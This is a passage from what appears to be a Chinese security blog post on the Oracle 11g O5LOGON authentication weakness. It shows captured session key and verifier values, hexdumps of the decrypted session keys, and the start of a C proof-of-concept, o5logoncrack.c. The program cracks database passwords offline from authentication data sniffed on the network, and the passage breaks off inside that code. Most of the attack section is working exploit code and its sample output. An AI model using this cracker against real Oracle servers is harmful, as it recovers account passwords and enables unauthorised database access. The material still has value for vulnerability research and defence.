byte)</span><br></pre></td></tr></table></figure>
+
+<p>AES 192 加密40字节的明文，需要填充 8个 0x08</p>
+<p>11.1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PASSWORD:            nsfocus</span><br><span class="line">AUTH_SESSKEY:        43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span><br><span class="line">AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span><br><span class="line">AUTH_PASSWORD:       8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span><br><span class="line">AUTH_VFR_DATA:       3DA8A309D636ACF87004</span><br><span class="line"></span><br><span class="line">PASSWORD HASH:       EF92924A1DB06441457FDABC24BF89055C8594F7</span><br></pre></td></tr></table></figure>
+
+<p>11.2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PASSWORD    :        nsfocus</span><br><span class="line">AUTH_SESSKEY:        52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="line">AUTH_SESSKEY_C       FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="line">AUTH_PASSWORD        2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="line">AUTH_VFR_DATA        43E0BE20B32B0BB76E57</span><br><span class="line"></span><br><span class="line">PASSWORD HASH:       C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aes key</span><br><span class="line">0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 05</span><br><span class="line">0010 5c 85 94 f7 00 00 00 00</span><br><span class="line"></span><br><span class="line">decrypted_server_sesskey</span><br><span class="line">0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 54</span><br><span class="line">0010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 26</span><br><span class="line">0020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08</span><br><span class="line"></span><br><span class="line">encrypted_server_sesskey</span><br><span class="line">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="line">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="line">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br><span class="line"></span><br><span class="line">AUTH_SESSKEY</span><br><span class="line">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="line">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="line">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aes key</span><br><span class="line">0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af</span><br><span class="line">0010 38 12 3f 88 00 00 00 00</span><br><span class="line"></span><br><span class="line">decrypted_server_sesskey</span><br><span class="line">0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a6</span><br><span class="line">0010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f5</span><br><span class="line">0020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08</span><br><span class="line"></span><br><span class="line">encrypted_server_sesskey</span><br><span class="line">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="line">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="line">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br><span class="line"></span><br><span class="line">AUTH_SESSKEY</span><br><span class="line">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="line">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="line">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="exploit-POC"><a href="#exploit-POC" class="headerlink" title="exploit (POC)"></a>exploit (POC)</h2><p>o5logoncrack.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">11.1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PASSWORD:            nsfocus</span></span><br><span class="line"><span class="comment">AUTH_SESSKEY:        43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span></span><br><span class="line"><span class="comment">AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span></span><br><span class="line"><span class="comment">AUTH_PASSWORD:       8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span></span><br><span class="line"><span class="comment">AUTH_VFR_DATA:       3DA8A309D636ACF87004</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PASSWORD HASH:       EF92924A1DB06441457FDABC24BF89055C8594F7</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">11.2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PASSWORD    :           nsfocus</span></span><br><span class="line"><span class="comment">AUTH_SESSKEY:           52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span></span><br><span class="line"><span class="comment">AUTH_SESSKEY_C          FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span></span><br><span class="line"><span class="comment">AUTH_PASSWORD           2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span></span><br><span class="line"><span class="comment">AUTH_VFR_DATA           43E0BE20B32B0BB76E57</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PASSWORD HASH:          C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">11.x</span></span><br><span class="line"><span class="comment">ED91B97A04000F326F17430A65DACB30CD1EF788E6EC310742B811E32112C0C9CC39554C9C01A090CB95E95C94140C28</span></span><br><span class="line"><span class="comment">40E7B86C99F4BF1D0F17538C22EBCE054F5F677E2B521480F1F56143D047C00469A87049DE1B9CADDC8EA71392AD6E3A</span></span><br><span class="line"><span class="comment">2D4FD970C12D9618742E4525C514105E0BE24DE75C04A0C4BF6DD46BE88A339E</span></span><br><span class="line"><span class="comment">7FD52BC80AA5836695D4</span></span><br><span class="line"><span class="comment">18C314BE125DF23689215C78C33F623AABF1152E</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line"><span class="comment">aes key</span></span><br><span class="line"><span class="comment">0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 05</span></span><br><span class="line"><span class="comment">0010 5c 85 94 f7 00 00 00 00</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">decrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 54</span></span><br><span class="line"><span class="comment">0010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 26</span></span><br><span class="line"><span class="comment">0020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">encrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span></span><br><span class="line"><span class="comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span></span><br><span class="line"><span class="comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">AUTH_SESSKEY</span></span><br><span class="line"><span class="comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span></span><br><span class="line"><span class="comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span></span><br><span class="line"><span class="comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line"><span class="comment">aes key</span></span><br><span class="line"><span class="comment">0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af</span></span><br><span class="line"><span class="comment">0010 38 12 3f 88 00 00 00 00</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">decrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a6</span></span><br><span class="line"><span class="comment">0010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f5</span></span><br><span class="line"><span class="comment">0020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">encrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span></span><br><span class="line"><span class="comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span></span><br><span class="line"><span class="comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">AUTH_SESSKEY</span></span><br><span class="line"><span class="comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span></span><br><span class="line"><span class="comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span></span><br><span class="line"><span class="comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------------------</span></span><br><span class="line"><span class="comment">aes key</span></span><br><span class="line"><span class="comment">0000 18 c3 14 be 12 5d f2 36 89 21 5c 78 c3 3f 62 3a</span></span><br><span class="line"><span class="comment">0010 ab f1 15 2e 00 00 00 00</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">decrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 07 eb ab db ee 3a 0e b0 ab e1 9f 68 12 c1 e3 e6</span></span><br><span class="line"><span class="comment">0010 5a e9 fd 7c b9 ca ae e2 fb 21 20 d4 af 83 de 0c</span></span><br><span class="line"><span class="comment">0020 1e 12 dc 01 22 05 a0 75 08 08 08 08 08 08 08 08</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">encrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span></span><br><span class="line"><span class="comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span></span><br><span class="line"><span class="comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">AUTH_SESSKEY</span></span><br><span class="line"><span class="comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span></span><br><span class="line"><span class="comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span></span><br><span class="line"><span class="comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/aes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"getopt.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//*********************************************************************************************************************</span></span><br><span class="line"><span class="comment">// Hashes captured on the network during authentication phase</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY  [] = &#123;  0x43,0xFD,0x38,0x02,0x93,0x77,0xC8,0x46,0x20,0xAE,0x18,0x51,0xFC,0x1D,0x23,0x14,0x09,0x98,0x50,0x64,0xDE,0xA0,0xD0,0xB8,0xD4,0x8E,0x50,0xE6,0x05,0x17,0x51,0xA5,0xD8,0xFD,0xFE,0xAA,0xA9,0xF8,0x3B,0x99,0xF3,0x7B,0x05,0x1F,0xA6,0x7F,0x85,0x46&#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY_C[] = &#123;  0xC7,0x24,0x8F,0x08,0x73,0xF0,0x4B,0x5A,0x02,0xE5,0x91,0x78,0x80,0x4B,0xD3,0x61,0xB0,0xC7,0x7B,0x20,0xA4,0xCF,0x68,0x54,0x60,0xDA,0x47,0x29,0x96,0xD5,0x24,0x57,0x45,0xA7,0x91,0xDF,0xEA,0x14,0x39,0x98,0x31,0xEC,0x62,0x38,0x08,0x08,0x90,0x3C&#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_PASSWORD [] = &#123;  0x8B,0x4C,0x7D,0x85,0xF4,0x21,0xEB,0xA0,0x59,0xFD,0xBA,0x21,0xF5,0x70,0x8F,0xD4,0xD3,0xBB,0x8A,0xB2,0x16,0x89,0x41,0x24,0x3B,0x5E,0xF0,0x76,0x81,0xF3,0xB8,0x0A &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x3D,0xA8,0xA3,0x09,0xD6,0x36,0xAC,0xF8,0x70,0x04 &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0x52,0xFC,0x04,0xB1,0xFF,0x81,0x10,0xCA,0x12,0x63,0xDF,0x5B,0xC6,0x1A,0x7E,0x57,0x74,0x0C,0x8A,0x51,0x11,0xD2,0x2B,0x41,0xE5,0x3C,0xC1,0x67,0xFD,0xF2,0xA6,0x87,0x89,0x58,0x20,0x0D,0x9B,0x2B,0x6A,0x51,0xC9,0x5D,0x77,0x9F,0xDE,0xBA,0xBB,0x69 &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY_C[] = &#123; 0xFA,0x6D,0xCD,0x0F,0x38,0x9E,0x92,0xD1,0x8F,0x81,0x88,0xEC,0x69,0x31,0x3B,0x52,0x4F,0x42,0x11,0x84,0xFA,0xE6,0x79,0x61,0x3A,0x72,0xFC,0x8D,0xFD,0x0A,0x4C,0x7B,0xB9,0x3A,0x6A,0xCB,0x8E,0x05,0xB8,0x25,0x8A,0x02,0x0D,0x29,0x54,0xEC,0x1B,0x63 &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_PASSWORD [] = &#123; 0x2C,0x5F,0x95,0x7A,0x65,0x32,0xAD,0x91,0xD9,0x16,0xF4,0xE5,0xFA,0x7D,0x2F,0xDA,0x0E,0x6C,0xDF,0xFB,0xAA,0xED,0x88,0x3C,0xAF,0x4F,0x20,0x0C,0x89,0x83,0xAE,0x3D &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x43,0xE0,0xBE,0x20,0xB3,0x2B,0x0B,0xB7,0x6E,0x57 &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0xED,0x91,0xB9,0x7A,0x04,0x00,0x0F,0x32,0x6F,0x17,0x43,0x0A,0x65,0xDA,0xCB,0x30,0xCD,0x1E,0xF7,0x88,0xE6,0xEC,0x31,0x07,0x42,0xB8,0x11,0xE3,0x21,0x12,0xC0,0xC9,0xCC,0x39,0x55,0x4C,0x9C,0x01,0xA0,0x90,0xCB,0x95,0xE9,0x5C,0x94,0x14,0x0C,0x28 &#125;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x7F,0xD5,0x2B,0xC8,0x0A,0xA5,0x83,0x66,0x95,0xD4 &#125;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY  [] = &#123;   0xBD,0x53,0x44,0x89,0x91,0xEE,0xAB,0x1E,0xCD,0x8D,0x32,0xFB,0x59,0x52,0x3F,0x0C,0xBD,0xB3,0x3B,0x40,0xC2,0x8F,0xEB,0xED,0xDD,0x5A,0xA3,0xA4,0xAF,0x0C,0xF6,0xB7,0x23,0x06,0x16,0x2D,0x3F,0x0C,0x1E,0x8D,0xB2,0x53,0x8A,0xF2,0x91,0xEC,0x01,0xA5&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x03,0x1C,0xB4,0x72,0xC4,0xD9,0x04,0x12,0xDD,0x31 &#125;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//*********************************************************************************************************************</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">HexStringtoBinArray</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="built_in">array</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> alen=<span class="built_in">strlen</span>(str)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> t[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hexc;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="built_in">strlen</span>(str);i=i+<span class="number">2</span>)&#123;</span><br><span class="line">        t[<span class="number">0</span>]=str[i];</span><br><span class="line">        t[<span class="number">1</span>]=str[i+<span class="number">1</span>];</span><br><span class="line">        hexc = t[<span class="number">0</span>]<span class="number">-48</span>;</span><br><span class="line">        <span class="keyword">if</span> (hexc &gt; <span class="number">9</span>) hexc-=<span class="number">7</span>;</span><br><span class="line">        <span class="built_in">array</span>[j]=hexc*<span class="number">16</span>;</span><br><span class="line">        hexc = t[<span class="number">1</span>]<span class="number">-48</span>;</span><br><span class="line">        <span class="keyword">if</span> (hexc &gt; <span class="number">9</span>) hexc-=<span class="number">7</span>;</span><br><span class="line">        <span class="built_in">array</span>[j]+=hexc;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hexdump</span><span class="params">( FILE *f, <span class="keyword">const</span> <span class="keyword">char</span> *title, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *s,<span class="keyword">int</span> l)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">"%s"</span>, title);</span><br><span class="line">    <span class="keyword">for</span> (; n &lt; l; ++n) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((n % <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(f, <span class="string">"\n%04x"</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(f, <span class="string">" %02x"</span>, s[n]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ORACLE_MixCase_Hash</span> <span class="params">(<span class="keyword">char</span> *passwd, <span class="keyword">int</span> passwd_len, <span class="keyword">unsigned</span> <span class="keyword">char</span> salt[<span class="number">10</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span>* oracle_mixcase_hash)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> to_hash[<span class="number">256</span>];</span><br><span class="line">    SHA_CTX ctx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span> (to_hash, passwd, passwd_len);</span><br><span class="line">    <span class="built_in">memcpy</span> (to_hash+passwd_len, salt, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    SHA1_Init 